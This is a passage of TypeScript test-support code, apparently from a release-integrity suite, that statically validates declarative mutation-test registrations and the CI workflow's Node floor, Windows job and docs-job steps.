              );
            }
            const witness = descriptorProperty("witness")[0]?.initializer;
            if (
              descriptorProperty("witness").length !== 1 ||
              witness === undefined ||
              !ts.isObjectLiteralExpression(witness)
            ) {
              const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
              problems.push(
                `release mutation declarative descriptor witness must be one literal object at ${position.line + 1}:${position.character + 1}`
              );
            } else {
              const witnessProperty = (name: string): ts.PropertyAssignment[] =>
                witness.properties.filter(
                  (property): property is ts.PropertyAssignment =>
                    ts.isPropertyAssignment(property) &&
                    ((ts.isIdentifier(property.name) && property.name.text === name) ||
                      (ts.isStringLiteral(property.name) && property.name.text === name))
                );
              const witnessPropertyNames = witness.properties.map((property) => {
                if (!ts.isPropertyAssignment(property)) return null;
                if (ts.isIdentifier(property.name) || ts.isStringLiteral(property.name)) return property.name.text;
                return null;
              });
              if (
                witnessPropertyNames.some((name) => name === null) ||
                witnessPropertyNames.length !== 4 ||
                new Set(witnessPropertyNames).size !== witnessPropertyNames.length ||
                !["kind", "anchor", "before", "after"].every((name) => witnessPropertyNames.includes(name))
              ) {
                const position = sourceFile.getLineAndCharacterOfPosition(witness.getStart(sourceFile));
                problems.push(
                  `release mutation declarative witness requires exact passive kind/anchor/before/after fields at ${position.line + 1}:${position.character + 1}`
                );
              }
              const witnessKind = witnessProperty("kind")[0]?.initializer;
              if (
                witnessProperty("kind").length !== 1 ||
                witnessKind === undefined ||
                !ts.isStringLiteral(witnessKind) ||
                (witnessKind.text !== "token" && witnessKind.text !== "line")
              ) {
                const position = sourceFile.getLineAndCharacterOfPosition(witness.getStart(sourceFile));
                problems.push(
                  `release mutation declarative witness kind must be one token/line literal at ${position.line + 1}:${position.character + 1}`
                );
              }
              const witnessAnchor = witnessProperty("anchor")[0]?.initializer;
              if (witnessProperty("anchor").length !== 1 || !passiveString(witnessAnchor)) {
                const position = sourceFile.getLineAndCharacterOfPosition(witness.getStart(sourceFile));
                problems.push(
                  `release mutation declarative witness anchor must be one passive identifier/string value at ${position.line + 1}:${position.character + 1}`
                );
              }
              const before = witnessProperty("before")[0]?.initializer;
              const after = witnessProperty("after")[0]?.initializer;
              const nonNegativeSafeLiteral = (value: ts.Expression | undefined): value is ts.NumericLiteral =>
                value !== undefined &&
                ts.isNumericLiteral(value) &&
                Number.isSafeInteger(Number(value.text)) &&
                Number(value.text) >= 0;
              if (
                witnessProperty("before").length !== 1 ||
                witnessProperty("after").length !== 1 ||
                !nonNegativeSafeLiteral(before) ||
                !nonNegativeSafeLiteral(after) ||
                Number(before.text) === Number(after.text)
              ) {
                const position = sourceFile.getLineAndCharacterOfPosition(witness.getStart(sourceFile));
                problems.push(
                  `release mutation declarative witness counts must be different non-negative safe integer literals at ${position.line + 1}:${position.character + 1}`
                );
              }
            }
          }
        } else {
          lastDeclarativeRegistrationEnd = Math.max(lastDeclarativeRegistrationEnd, parent.end);
          const descriptor = parent.arguments[0];
          const statement =
            ts.isExpressionStatement(parent.parent) && parent.parent.expression === parent ? parent.parent : null;
          const isTopLevel = statement !== null && matrixCallback !== null && statement.parent === matrixCallback.body;
          if (
            parent.arguments.length !== 1 ||
            descriptor === undefined ||
            !ts.isObjectLiteralExpression(descriptor) ||
            !isTopLevel
          ) {
            const position = sourceFile.getLineAndCharacterOfPosition(start);
            problems.push(
              `release mutation declarative registerCase requires one top-level expression call with an object and literal id at ${position.line + 1}:${position.character + 1}`
            );
          } else {
            const idProperties = descriptor.properties.filter(
              (property): property is ts.PropertyAssignment =>
                ts.isPropertyAssignment(property) &&
                ((ts.isIdentifier(property.name) && property.name.text === "id") ||
                  (ts.isStringLiteral(property.name) && property.name.text === "id"))
            );
            const id = idProperties[0]?.initializer;
            if (idProperties.length !== 1 || id === undefined || !ts.isStringLiteral(id)) {
              const position = sourceFile.getLineAndCharacterOfPosition(start);
              problems.push(
                `release mutation declarative registerCase requires one object with a literal id at ${position.line + 1}:${position.character + 1}`
              );
            } else {
              if (declarativeCaseIds.has(id.text)) {
                problems.push(`release mutation declarative duplicate case id ${id.text}`);
              }
              declarativeCaseIds.add(id.text);
            }
            declarativeCases++;
            declarativeCaseDescriptors.push(descriptor);
          }
        }
      }
    }
    ts.forEachChild(node, visitCalls);
  };
  visitCalls(sourceFile);

  for (const descriptor of declarativeCaseDescriptors) {
    const properties = (name: string): ts.PropertyAssignment[] =>
      descriptor.properties.filter(
        (property): property is ts.PropertyAssignment =>
          ts.isPropertyAssignment(property) &&
          ((ts.isIdentifier(property.name) && property.name.text === name) ||
            (ts.isStringLiteral(property.name) && property.name.text === name))
      );
    const root = properties("root")[0]?.initializer;
    const invoke = properties("invoke")[0]?.initializer;
    const expectations = properties("expectations")[0]?.initializer;
    const casePropertyNames = descriptor.properties.map((property) => {
      if (!ts.isPropertyAssignment(property)) return null;
      if (ts.isIdentifier(property.name) || ts.isStringLiteral(property.name)) return property.name.text;
      return null;
    });
    if (
      casePropertyNames.length !== 4 ||
      new Set(casePropertyNames).size !== 4 ||
      !["id", "root", "invoke", "expectations"].every((name) => casePropertyNames.includes(name))
    ) {
      const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
      problems.push(
        `release mutation declarative registerCase requires exact id/root/invoke/expectations properties at ${position.line + 1}:${position.character + 1}`
      );
    }
    let rootHandle: string | null = null;
    if (properties("root").length !== 1 || root === undefined || !ts.isIdentifier(root)) {
      const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
      problems.push(
        `release mutation declarative registerCase requires one explicit mutation-handle root at ${position.line + 1}:${position.character + 1}`
      );
    } else if (!declarativeMutationHandles.has(root.text)) {
      const position = sourceFile.getLineAndCharacterOfPosition(root.getStart(sourceFile));
      const detail = declarativeSourceHandles.has(root.text)
        ? "source handle cannot be a case root"
        : "unknown root handle";
      problems.push(
        `release mutation declarative ${detail} ${root.text} at ${position.line + 1}:${position.character + 1}`
      );
    } else {
      rootHandle = root.text;
      if (declarativeCaseRoots.has(rootHandle)) {
        problems.push(`release mutation declarative duplicate case root ${rootHandle}`);
      }
      declarativeCaseRoots.add(rootHandle);
    }
    let invocationKind: "fixture.text" | "fixture.throw" | null = null;
    if (properties("invoke").length !== 1 || invoke === undefined || !ts.isObjectLiteralExpression(invoke)) {
      const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
      problems.push(
        `release mutation declarative registerCase requires one literal invoke object at ${position.line + 1}:${position.character + 1}`
      );
    } else {
      const invocationProperties = (name: string): ts.PropertyAssignment[] =>
        invoke.properties.filter(
          (property): property is ts.PropertyAssignment =>
            ts.isPropertyAssignment(property) &&
            ((ts.isIdentifier(property.name) && property.name.text === name) ||
              (ts.isStringLiteral(property.name) && property.name.text === name))
        );
      const baseline = invocationProperties("baseline")[0]?.initializer;
      const mutant = invocationProperties("mutant")[0]?.initializer;
      const kind = invocationProperties("kind")[0]?.initializer;
      const invocationPropertyNames = invoke.properties.map((property) => {
        if (!ts.isPropertyAssignment(property)) return null;
        if (ts.isIdentifier(property.name) || ts.isStringLiteral(property.name)) return property.name.text;
        return null;
      });
      if (invocationProperties("kind").length !== 1 || kind === undefined || !ts.isStringLiteral(kind)) {
        const position = sourceFile.getLineAndCharacterOfPosition(invoke.getStart(sourceFile));
        problems.push(
          `release mutation declarative case invocation requires one literal kind at ${position.line + 1}:${position.character + 1}`
        );
      } else if (kind.text === "fixture.text" || kind.text === "fixture.throw") {
        invocationKind = kind.text;
      } else {
        const position = sourceFile.getLineAndCharacterOfPosition(kind.getStart(sourceFile));
        problems.push(
          `release mutation declarative case invocation kind must be one closed literal at ${position.line + 1}:${position.character + 1}`
        );
      }
      const expectedInvocationProperties =
        invocationKind === "fixture.text"
          ? ["kind", "baseline", "mutant"]
          : invocationKind === "fixture.throw"
            ? ["kind", "baseline", "mutant", "message"]
            : null;
      if (
        invocationPropertyNames.some((name) => name === null) ||
        new Set(invocationPropertyNames).size !== invocationPropertyNames.length ||
        (expectedInvocationProperties !== null &&
          (invocationPropertyNames.length !== expectedInvocationProperties.length ||
            !expectedInvocationProperties.every((name) => invocationPropertyNames.includes(name))))
      ) {
        const position = sourceFile.getLineAndCharacterOfPosition(invoke.getStart(sourceFile));
        problems.push(
          `release mutation declarative case invocation has unexpected, missing, computed or duplicate properties at ${position.line + 1}:${position.character + 1}`
        );
      }
      if (
        invocationProperties("baseline").length !== 1 ||
        baseline === undefined ||
        !ts.isIdentifier(baseline) ||
        (!declarativeSourceHandles.has(baseline.text) && !declarativeMutationHandles.has(baseline.text)) ||
        baseline.text === rootHandle
      ) {
        const position = sourceFile.getLineAndCharacterOfPosition(invoke.getStart(sourceFile));
        problems.push(
          `release mutation declarative case invocation requires one explicit clean baseline handle distinct from its root at ${position.line + 1}:${position.character + 1}`
        );
      }
      if (
        invocationProperties("mutant").length !== 1 ||
        mutant === undefined ||
        !ts.isIdentifier(mutant) ||
        rootHandle === null ||
        mutant.text !== rootHandle
      ) {
        const position = sourceFile.getLineAndCharacterOfPosition(invoke.getStart(sourceFile));
        problems.push(
          `release mutation declarative case invocation mutant must be the exact case root handle at ${position.line + 1}:${position.character + 1}`
        );
      }
      if (invocationKind === "fixture.throw") {
        const message = invocationProperties("message")[0]?.initializer;
        if (
          invocationProperties("message").length !== 1 ||
          message === undefined ||
          !ts.isStringLiteral(message) ||
          message.text.length === 0
        ) {
          const position = sourceFile.getLineAndCharacterOfPosition(invoke.getStart(sourceFile));
          problems.push(
            `release mutation declarative fixture.throw invocation requires one non-empty literal message at ${position.line + 1}:${position.character + 1}`
          );
        }
      }
    }
    if (
      properties("expectations").length !== 1 ||
      expectations === undefined ||
      !ts.isArrayLiteralExpression(expectations) ||
      expectations.elements.length === 0
    ) {
      const position = sourceFile.getLineAndCharacterOfPosition(descriptor.getStart(sourceFile));
      problems.push(
        `release mutation declarative registerCase requires one non-empty literal expectations array at ${position.line + 1}:${position.character + 1}`
      );
      continue;
    }
    const caseExpectationSemantics = new Set<string>();
    for (const expectation of expectations.elements) {
      if (!ts.isObjectLiteralExpression(expectation)) {
        const position = sourceFile.getLineAndCharacterOfPosition(expectation.getStart(sourceFile));
        problems.push(
          `release mutation declarative expectation must be one object with literal id/kind at ${position.line + 1}:${position.character + 1}`
        );
        continue;
      }
      const expectationProperty = (name: string): ts.PropertyAssignment[] =>
        expectation.properties.filter(
          (property): property is ts.PropertyAssignment =>
            ts.isPropertyAssignment(property) &&
            ((ts.isIdentifier(property.name) && property.name.text === name) ||
              (ts.isStringLiteral(property.name) && property.name.text === name))
        );
      const expectationPropertyNames = expectation.properties.map((property) => {
        if (!ts.isPropertyAssignment(property)) return null;
        if (ts.isIdentifier(property.name) || ts.isStringLiteral(property.name)) return property.name.text;
        return null;
      });
      if (
        expectationPropertyNames.some((name) => name === null) ||
        new Set(expectationPropertyNames).size !== expectationPropertyNames.length
      ) {
        const position = sourceFile.getLineAndCharacterOfPosition(expectation.getStart(sourceFile));
        problems.push(
          `release mutation declarative expectation forbids spread, computed and duplicate properties at ${position.line + 1}:${position.character + 1}`
        );
      }
      const id = expectationProperty("id")[0]?.initializer;
      const kind = expectationProperty("kind")[0]?.initializer;
      if (
        expectationProperty("id").length !== 1 ||
        expectationProperty("kind").length !== 1 ||
        id === undefined ||
        !ts.isStringLiteral(id) ||
        kind === undefined ||
        !ts.isStringLiteral(kind)
      ) {
        const position = sourceFile.getLineAndCharacterOfPosition(expectation.getStart(sourceFile));
        problems.push(
          `release mutation declarative expectation must be one object with literal id/kind at ${position.line + 1}:${position.character + 1}`
        );
        continue;
      }
      const closedExpectationKinds = new Set(["problem", "equal", "not-equal", "regex"]);
      if (!closedExpectationKinds.has(kind.text)) {
        const position = sourceFile.getLineAndCharacterOfPosition(kind.getStart(sourceFile));
        problems.push(
          `release mutation declarative expectation kind must be one closed literal at ${position.line + 1}:${position.character + 1}`
        );
      } else {
        let semanticIdentity: string | null = null;
        const expectedExpectationProperties =
          kind.text === "problem"
            ? ["id", "kind", "problem"]
            : kind.text === "regex"
              ? ["id", "kind", "regex"]
              : ["id", "kind", "value"];
        if (
          expectationPropertyNames.length !== expectedExpectationProperties.length ||
          !expectedExpectationProperties.every((name) => expectationPropertyNames.includes(name))
        ) {
          const position = sourceFile.getLineAndCharacterOfPosition(expectation.getStart(sourceFile));
          problems.push(
            `release mutation declarative expectation ${id.text} has unexpected or missing closed fields at ${position.line + 1}:${position.character + 1}`
          );
        }
        if (kind.text === "problem") {
          const problem = expectationProperty("problem")[0]?.initializer;
          if (
            expectationProperty("problem").length !== 1 ||
            problem === undefined ||
            !ts.isStringLiteral(problem) ||
            problem.text !== "fixture.mutant-threw"
          ) {
            const position = sourceFile.getLineAndCharacterOfPosition(expectation.getStart(sourceFile));
            problems.push(
              `release mutation declarative problem expectation ${id.text} requires one exact problem identity at ${position.line + 1}:${position.character + 1}`
            );
          } else semanticIdentity = JSON.stringify([kind.text, problem.text]);
        } else if (kind.text === "regex") {
          const regex = expectationProperty("regex")[0]?.initializer;
          if (
            expectationProperty("regex").length !== 1 ||
            regex === undefined ||
            !ts.isStringLiteral(regex) ||
            regex.text !== "fixture.omega-token"
          ) {
            const position = sourceFile.getLineAndCharacterOfPosition(expectation.getStart(sourceFile));
            problems.push(
              `release mutation declarative regex expectation ${id.text} requires one named regex identity at ${position.line + 1}:${position.character + 1}`
            );
          } else semanticIdentity = JSON.stringify([kind.text, regex.text]);
        } else {
          const value = expectationProperty("value")[0]?.initializer;
          if (expectationProperty("value").length !== 1 || value === undefined || !ts.isStringLiteral(value)) {
            const position = sourceFile.getLineAndCharacterOfPosition(expectation.getStart(sourceFile));
            problems.push(
              `release mutation declarative ${kind.text} expectation ${id.text} requires one literal string value at ${position.line + 1}:${position.character + 1}`
            );
          } else semanticIdentity = JSON.stringify([kind.text, value.text]);
        }
        if (semanticIdentity !== null) {
          if (caseExpectationSemantics.has(semanticIdentity)) {
            problems.push(`release mutation declarative expectation ${id.text} duplicates one case semantic check`);
          } else caseExpectationSemantics.add(semanticIdentity);
        }
        if (
          (invocationKind === "fixture.text" && kind.text === "problem") ||
          (invocationKind === "fixture.throw" && kind.text !== "problem")
        ) {
          const position = sourceFile.getLineAndCharacterOfPosition(expectation.getStart(sourceFile));
          problems.push(
            `release mutation declarative expectation ${id.text} is incompatible with ${invocationKind} at ${position.line + 1}:${position.character + 1}`
          );
        }
      }
      if (declarativeExpectationIds.has(id.text)) {
        problems.push(`release mutation declarative duplicate expectation id ${id.text}`);
      }
      declarativeExpectationIds.add(id.text);
    }
  }

  if (firstDefinitions !== 1 || allDefinitions !== 1) {
    problems.push(
      `release mutation helper definitions expected 1 first / 1 all, found ${firstDefinitions} first / ${allDefinitions} all`
    );
  }
  const selfCount = selfFirst + selfAll;
  if (selfCount !== RELEASE_MUTATION_SELF_CONTROL_COUNT) {
    problems.push(
      `release mutation self-controls expected ${RELEASE_MUTATION_SELF_CONTROL_COUNT}, found ${selfCount} (${selfFirst} first / ${selfAll} all)`
    );
  }
  const hybridFirst = projectFirst + declarativeFirst;
  const hybridAll = projectAll + declarativeAll;
  const declarativeRegistrations = declarativeSources + declarativeFirst + declarativeAll + declarativeCases;
  const exactPlanInventories = declarativePlanInventories.filter(
    (inventory) =>
      inventory.structurallyValid &&
      inventory.total === declarativeFirst + declarativeAll &&
      inventory.first === declarativeFirst &&
      inventory.all === declarativeAll
  ).length;
  if (declarativeRegistrations > 0 && (declarativePlanBindings !== 1 || exactPlanInventories !== 1)) {
    problems.push(
      `release mutation declarative registrations require one top-level const releaseMutationPlan whose literal total/first/all inventory matches the declarative subset ${declarativeFirst + declarativeAll}/${declarativeFirst}/${declarativeAll}; found ${declarativePlanBindings} binding(s), ${exactPlanInventories} exact`
    );
  }
  if (declarativeRegistrations > 0) {
    const seal = declarativeSealCalls[0];
    const execute = declarativeExecuteCalls[0];
    let exactSealAndExecute = declarativeSealCalls.length === 1 && declarativeExecuteCalls.length === 1;
    if (seal !== undefined && execute !== undefined && matrixCallback !== null && ts.isBlock(matrixCallback.body)) {
      const sealDeclaration =
        ts.isVariableDeclaration(seal.parent) && seal.parent.initializer === seal ? seal.parent : null;
      const sealList =
        sealDeclaration !== null && ts.isVariableDeclarationList(sealDeclaration.parent)
          ? sealDeclaration.parent
          : null;
      const sealStatement = sealList !== null && ts.isVariableStatement(sealList.parent) ? sealList.parent : null;
      const executeStatement =
        ts.isExpressionStatement(execute.parent) && execute.parent.expression === execute ? execute.parent : null;
      const statements = matrixCallback.body.statements;
      const sealIndex = sealStatement === null ? -1 : statements.indexOf(sealStatement);
      const assertionStatement = sealIndex >= 0 ? statements[sealIndex + 1] : undefined;
      const expectedExecuteStatement = sealIndex >= 0 ? statements[sealIndex + 2] : undefined;
      const assertionCall =
        assertionStatement !== undefined &&
        ts.isExpressionStatement(assertionStatement) &&
        ts.isCallExpression(assertionStatement.expression)
          ? assertionStatement.expression
          : null;
      const matcher =
        assertionCall !== null && ts.isPropertyAccessExpression(assertionCall.expression)
          ? assertionCall.expression
          : null;
      const expectCall = matcher !== null && ts.isCallExpression(matcher.expression) ? matcher.expression : null;
      const exactCleanSealAssertion =
        matcher !== null &&
        matcher.name.text === "toEqual" &&
        expectCall !== null &&
        ts.isIdentifier(expectCall.expression) &&
        expectCall.expression.text === "expect" &&
        expectCall.arguments.length === 1 &&
        expectCall.arguments[0] !== undefined &&
        ts.isIdentifier(expectCall.arguments[0]) &&
        expectCall.arguments[0].text === "releaseMutationProblems" &&
        assertionCall !== null &&
        assertionCall.arguments.length === 1 &&
        assertionCall.arguments[0] !== undefined &&
        ts.isArrayLiteralExpression(assertionCall.arguments[0]) &&
        assertionCall.arguments[0].elements.length === 0;
      exactSealAndExecute =
        exactSealAndExecute &&
        sealDeclaration !== null &&
        ts.isIdentifier(sealDeclaration.name) &&
        sealDeclaration.name.text === "releaseMutationProblems" &&
        sealList !== null &&
        (sealList.flags & ts.NodeFlags.Const) !== 0 &&
        sealStatement !== null &&
        sealStatement.parent === matrixCallback.body &&
        seal.getStart(sourceFile) > lastDeclarativeRegistrationEnd &&
        exactCleanSealAssertion &&
        executeStatement !== null &&
        executeStatement === expectedExecuteStatement &&
        execute.getStart(sourceFile) > seal.end;
    } else exactSealAndExecute = false;
    if (!exactSealAndExecute) {
      problems.push(
        "release mutation declarative plan requires one top-level const releaseMutationProblems = releaseMutationPlan.seal(), immediate expect(...).toEqual([]), then one direct releaseMutationPlan.execute() after all registrations"
      );
    }
  } else if (declarativeSealCalls.length !== 0 || declarativeExecuteCalls.length !== 0) {
    problems.push("release mutation declarative seal/execute cannot exist without declarative registrations");
  }
  if (
    hybridFirst !== RELEASE_MUTATION_PROJECT_FIRST_COUNT ||
    hybridAll !== RELEASE_MUTATION_PROJECT_ALL_COUNT ||
    hybridFirst + hybridAll !== RELEASE_MUTATION_PROJECT_TOTAL_COUNT
  ) {
    problems.push(
      `release mutation hybrid inventory expected ${RELEASE_MUTATION_PROJECT_FIRST_COUNT} first / ${RELEASE_MUTATION_PROJECT_ALL_COUNT} all, found ${hybridFirst} first / ${hybridAll} all (legacy ${projectFirst}/${projectAll}; declarative ${declarativeFirst}/${declarativeAll}; cases ${declarativeCases})`
    );
  }
  // D-58 topology gate only. Before the final legacy=0 boundary can close 5f.5a, the bounded
  // migration PRs must also land an independently reviewed legacy-to-descriptor identity manifest;
  // these cardinalities deliberately cannot prove semantic one-for-one substitution by themselves.
  if (projectFirst + projectAll === 0) {
    const dependencyOnly = declarativeMutationHandles.size - declarativeCaseRoots.size;
    if (
      declarativeMutationIds.size !== RELEASE_MUTATION_PROJECT_TOTAL_COUNT ||
      declarativeCases !== RELEASE_MUTATION_PROJECT_ROOT_COUNT ||
      declarativeCaseRoots.size !== RELEASE_MUTATION_PROJECT_ROOT_COUNT ||
      declarativeExpectationIds.size !== RELEASE_MUTATION_PROJECT_EXPECTATION_COUNT ||
      dependencyOnly !== RELEASE_MUTATION_PROJECT_DEPENDENCY_ONLY_COUNT
    ) {
      problems.push(
        `release mutation final closed graph expected ${RELEASE_MUTATION_PROJECT_TOTAL_COUNT} unique descriptors / ${RELEASE_MUTATION_PROJECT_ROOT_COUNT} cases and roots / ${RELEASE_MUTATION_PROJECT_EXPECTATION_COUNT} expectations / ${RELEASE_MUTATION_PROJECT_DEPENDENCY_ONLY_COUNT} dependency-only, found ${declarativeMutationIds.size} descriptors / ${declarativeCases} cases / ${declarativeCaseRoots.size} roots / ${declarativeExpectationIds.size} expectations / ${dependencyOnly} dependency-only`
      );
    }
  }
  if (outside !== 0) {
    problems.push(`release mutation helpers outside the reviewed matrix/self-control callback: ${outside}`);
  }
  problems.push(...nonStraightLineProjectCalls);
  return problems;
}

const releaseMutationInventoryBootstrapProblems = releaseMutationInventoryProblems(
  readFileSync(new URL("./release-integrity.test.ts", import.meta.url), "utf8")
);
if (releaseMutationInventoryBootstrapProblems.length !== 0) {
  throw new Error(
    `release mutation inventory bootstrap failed:\n${releaseMutationInventoryBootstrapProblems.join("\n")}`
  );
}

function nodeFloorCiProblems(workflow: string, enginesNode: unknown): string[] {
  const floorMatch = typeof enginesNode === "string" ? /^>=(\d+\.\d+\.\d+)$/.exec(enginesNode) : null;
  if (!floorMatch) return ["engines.node must be one exact >=X.Y.Z floor"];
  const floor = floorMatch[1] ?? "";
  const major = floor.split(".")[0] ?? "";
  const problems: string[] = [];

  let document: YamlRecord | null = null;
  try {
    document = yamlRecord(load(workflow));
  } catch {
    return ["ci.yml must be valid YAML"];
  }
  const jobs = yamlRecord(document?.jobs);
  const testJob = yamlRecord(jobs?.test);
  const windowsJob = yamlRecord(jobs?.["test-windows"]);
  const docsJob = yamlRecord(jobs?.docs);
  const smokeJob = yamlRecord(jobs?.smoke);
  const protocolMatrixJob = yamlRecord(jobs?.["protocol-conformance-matrix"]);
  const protocolAggregateJob = yamlRecord(jobs?.["protocol-conformance"]);
  const packageMatrixJob = yamlRecord(jobs?.["package-consumer-matrix"]);
  const packageAggregateJob = yamlRecord(jobs?.["package-consumer"]);
  const mcpbPackageJob = yamlRecord(jobs?.["mcpb-basic-package"]);
  const mcpbMatrixJob = yamlRecord(jobs?.["mcpb-basic-matrix"]);
  const mcpbAggregateJob = yamlRecord(jobs?.["mcpb-basic"]);
  const dockerJob = yamlRecord(jobs?.docker);
  if (!testJob) return ["missing test job"];
  if (major !== "22") {
    problems.push("engines.node major changed; update the stable release-check inventory");
  }
  if (testJob.name !== `test (\${{ matrix.label }})`) {
    problems.push("test job must preserve stable matrix labels");
  }
  if ("continue-on-error" in testJob) {
    problems.push("test job must not declare continue-on-error");
  }
  if (yamlRecord(testJob.env)?.NPM_CONFIG_ENGINE_STRICT !== "true") {
    problems.push("test job must enforce npm engine-strict");
  }

  const strategy = yamlRecord(testJob.strategy);
  const matrix = yamlRecord(strategy?.matrix);
  const includeValue = matrix?.include;
  const rows = Array.isArray(includeValue)
    ? includeValue.map(yamlRecord).filter((row): row is YamlRecord => row !== null)
    : [];
  if (rows.length !== 2) {
    problems.push("test matrix must contain exactly the floor and Node 24 control legs");
  }
  const floorRow = rows.find((row) => row.label === "22");
  if (floorRow?.["node-version"] !== floor || floorRow.floor !== true) {
    problems.push(`test (${major}) must run exact engines.node floor ${floor}`);
  }
  const controlRow = rows.find((row) => row.label === "24");
  if (controlRow?.["node-version"] !== "24" || controlRow.floor !== false) {
    problems.push("test (24) control leg is missing");
  }

  const testSteps = yamlSteps(testJob);
  const testSetup = testSteps.find(
    (step) => typeof step.uses === "string" && step.uses.startsWith("actions/setup-node@")
  );
  if (yamlRecord(testSetup?.with)?.["node-version"] !== `\${{ matrix.node-version }}`) {
    problems.push("test setup-node must consume matrix.node-version");
  }
  const assertion = namedStep(testSteps, "Assert exact declared Node floor");
  const assertionRun = runBody(assertion);
  if (
    assertion?.if !== "matrix.floor" ||
    !assertionRun.includes('require("./package.json").engines?.node') ||
    !assertionRun.includes("process.versions.node") ||
    !assertionRun.includes("if (declared !== expected)") ||
    !assertionRun.includes("throw new Error")
  ) {
    problems.push("test floor runtime assertion is missing");
  }

  const install = namedStep(testSteps, "Install deps (npm ci with retry)");
  if (!hasRunLine(install, "npm ci && break")) {
    problems.push("test floor job missing executable npm ci retry");
  }
  if (!testSteps.some((step) => step.run === "npm run build")) {
    problems.push("test floor job missing npm run build");
  }
  const probe = namedStep(testSteps, "Probe native SQLite and FTS5 at declared floor");
  const probeRun = runBody(probe);
  if (
    probe?.if !== "matrix.floor" ||
    "continue-on-error" in (probe ?? {}) ||
    !probeRun.includes('new Database(":memory:")') ||
    !probeRun.includes("CREATE VIRTUAL TABLE notes USING fts5") ||
    !probeRun.includes("INSERT INTO notes") ||
    !probeRun.includes("notes MATCH") ||
    !probeRun.includes("db.close()")
  ) {
    problems.push("test floor native SQLite/FTS probe is missing");
  }
  if (!testSteps.some((step) => step.run === "npm test")) {
    problems.push("test floor job missing npm test");
  }

  if (!windowsJob) {
    problems.push("missing blocking test-windows job");
  } else {
    if (windowsJob.name !== "test-windows" || windowsJob["runs-on"] !== "windows-2025") {
      problems.push("test-windows must preserve its exact name and pinned windows-2025 runner");
    }
    if ("continue-on-error" in windowsJob || "if" in windowsJob || "needs" in windowsJob || "strategy" in windowsJob) {
      problems.push("test-windows must be an unconditional fail-capable standalone job");
    }
    const windowsEnv = yamlRecord(windowsJob.env);
    if (windowsEnv?.NPM_CONFIG_ENGINE_STRICT !== "true") {
      problems.push("test-windows must enforce npm engine-strict");
    }
    if (windowsEnv?.NPM_CONFIG_SCRIPT_SHELL !== "C:\\Program Files\\Git\\bin\\bash.exe") {
      problems.push("test-windows must run npm lifecycle scripts through pinned Git Bash");
    }
    if (yamlRecord(yamlRecord(windowsJob.defaults)?.run)?.shell !== "bash") {
      problems.push("test-windows steps must run through Git Bash");
    }

    const windowsSteps = yamlSteps(windowsJob);
    if (windowsSteps.some((step) => "continue-on-error" in step || "if" in step)) {
      problems.push("test-windows steps must be unconditional and must not declare continue-on-error");
    }
    const windowsSetup = windowsSteps.find(
      (step) => typeof step.uses === "string" && step.uses.startsWith("actions/setup-node@")
    );
    if (yamlRecord(windowsSetup?.with)?.["node-version"] !== floor) {
      problems.push(`test-windows must run exact engines.node floor ${floor}`);
    }
    const windowsAssertion = namedStep(windowsSteps, "Assert real case-insensitive Windows filesystem");
    const windowsAssertionRun = runBody(windowsAssertion);
    if (
      !windowsAssertionRun.includes('process.platform !== "win32"') ||
      !windowsAssertionRun.includes('"CaseProbe.md"') ||
      !windowsAssertionRun.includes('"caseprobe.md"') ||
      !windowsAssertionRun.includes("writeFileSync") ||
      !windowsAssertionRun.includes("existsSync") ||
      !windowsAssertionRun.includes('if (!existsSync(join(dir, "caseprobe.md")))') ||
      !windowsAssertionRun.includes('throw new Error("Windows filesystem probe is not case-insensitive")') ||
      !windowsAssertionRun.includes("finally") ||
      !windowsAssertionRun.includes("rmSync")
    ) {
      problems.push("test-windows platform and case-insensitive filesystem assertion is missing");
    }
    const windowsInstall = namedStep(windowsSteps, "Install deps (npm ci with retry)");
    if (!hasRunLine(windowsInstall, "npm ci && break")) {
      problems.push("test-windows missing executable npm ci retry");
    }
    if (!windowsSteps.some((step) => step.run === "npm run build")) {
      problems.push("test-windows missing npm run build");
    }
    const windowsProbeRun = runBody(namedStep(windowsSteps, "Probe native SQLite and FTS5 on Windows"));
    if (
      !windowsProbeRun.includes('new Database(":memory:")') ||
      !windowsProbeRun.includes("CREATE VIRTUAL TABLE notes USING fts5") ||
      !windowsProbeRun.includes("INSERT INTO notes(body) VALUES (?)") ||
      !windowsProbeRun.includes("notes MATCH") ||
      !windowsProbeRun.includes('row?.body !== "windows probe"') ||
      !windowsProbeRun.includes('throw new Error("Windows SQLite FTS5 probe returned the wrong row")') ||
      !windowsProbeRun.includes("db.close()")
    ) {
      problems.push("test-windows native SQLite/FTS probe is missing");
    }
    if (!windowsSteps.some((step) => step.run === "npm test -- tests/windows-path-safety.test.ts")) {
      problems.push("test-windows missing the executable hostile-filesystem suite");
    }
    const watcherGuardSuite = namedStep(windowsSteps, "Test watcher startup interlock on Windows");
    if (
      watcherGuardSuite?.run !== "npm test -- tests/watcher-activation-guard.test.ts" ||
      "if" in (watcherGuardSuite ?? {}) ||
      "continue-on-error" in (watcherGuardSuite ?? {})
    ) {
      problems.push("test-windows missing the exact watcher activation-guard suite");
    }
  }

  if (!docsJob) {
    problems.push("missing docs job");
  } else {
    const docsSteps = yamlSteps(docsJob);
    const schemaCaptureIndex = docsSteps.findIndex((step) => step.run === "npm run schema:inventory -- --write");
    const schemaArtifactIndex = docsSteps.findIndex(
      (step) => step.name === "Export remotely captured MCP schema inventory"
    );
    const schemaDiffIndex = docsSteps.findIndex((step) => step.name === "Require committed MCP schema inventory");
    const schemaCapture = docsSteps[schemaCaptureIndex];
    const schemaArtifact = docsSteps[schemaArtifactIndex];
    const schemaArtifactWith = yamlRecord(schemaArtifact?.with);
    const schemaDiff = docsSteps[schemaDiffIndex];
    const previewRenderIndex = docsSteps.findIndex((step) => step.run === "npm run render:preview");
    const previewArtifactIndex = docsSteps.findIndex((step) => step.name === "Export remotely rendered social preview");
    const previewDiffIndex = docsSteps.findIndex((step) => step.name === "Require committed social-preview bytes");
    const previewRender = docsSteps[previewRenderIndex];
    const previewArtifact = docsSteps[previewArtifactIndex];
    const previewArtifactWith = yamlRecord(previewArtifact?.with);
    const previewDiff = docsSteps[previewDiffIndex];
    if (
      !schemaCapture ||
      "if" in schemaCapture ||
      "continue-on-error" in schemaCapture ||
      schemaArtifact?.id !== "schema_inventory_artifact" ||
      schemaArtifact?.uses !== "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a" ||
